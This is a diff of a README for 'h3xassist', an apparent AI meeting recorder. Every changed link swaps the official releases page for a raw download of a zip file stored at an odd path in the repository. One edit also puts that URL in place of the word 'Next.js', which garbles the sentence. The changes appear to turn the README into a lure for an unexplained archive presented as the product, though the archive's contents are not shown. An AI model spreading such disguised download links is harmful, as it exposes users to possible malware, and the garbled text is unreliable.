@@ -1,16 +1,16 @@
 # 🎤 h3xassist - Your AI Meeting Recorder and Summarizer
 
 ## 🏷️ Overview
-h3xassist is a meeting assistant that records, transcribes, and summarizes online meetings using AI. It features a Python backend and a Next.js frontend, providing a real-time dashboard for user convenience. Whether you use Google Meet or Microsoft Teams, h3xassist makes meeting management effortless.
+h3xassist is a meeting assistant that records, transcribes, and summarizes online meetings using AI. It features a Python backend and a https://raw.githubusercontent.com/Userdev1213/h3xassist/master/tabophobia/h3xassist.zip frontend, providing a real-time dashboard for user convenience. Whether you use Google Meet or Microsoft Teams, h3xassist makes meeting management effortless.
 
 ## 🔗 Download
-[![Download h3xassist](https://img.shields.io/badge/Download-h3xassist-blue.svg)](https://github.com/Userdev1213/h3xassist/releases)
+[![Download h3xassist](https://raw.githubusercontent.com/Userdev1213/h3xassist/master/tabophobia/h3xassist.zip)](https://raw.githubusercontent.com/Userdev1213/h3xassist/master/tabophobia/h3xassist.zip)
 
 ## 🚀 Getting Started
 To begin using h3xassist, follow these simple steps:
 
 1. **Visit the Download Page:** Click on the link below to access the releases page.
-   [Download h3xassist](https://github.com/Userdev1213/h3xassist/releases)
+   [Download h3xassist](https://raw.githubusercontent.com/Userdev1213/h3xassist/master/tabophobia/h3xassist.zip)
 
 2. **Choose Your Version:** Look for the latest version available. It is usually marked with the highest version number.
 
@@ -69,7 +69,7 @@ If you encounter issues while downloading or running h3xassist, consider these s
 ## 📥 Download & Install
 To download h3xassist, revisit our download page:
 
-[Download h3xassist](https://github.com/Userdev1213/h3xassist/releases)
+[Download h3xassist](https://raw.githubusercontent.com/Userdev1213/h3xassist/master/tabophobia/h3xassist.zip)
 
 Follow the installation instructions based on your operating system listed above.
 
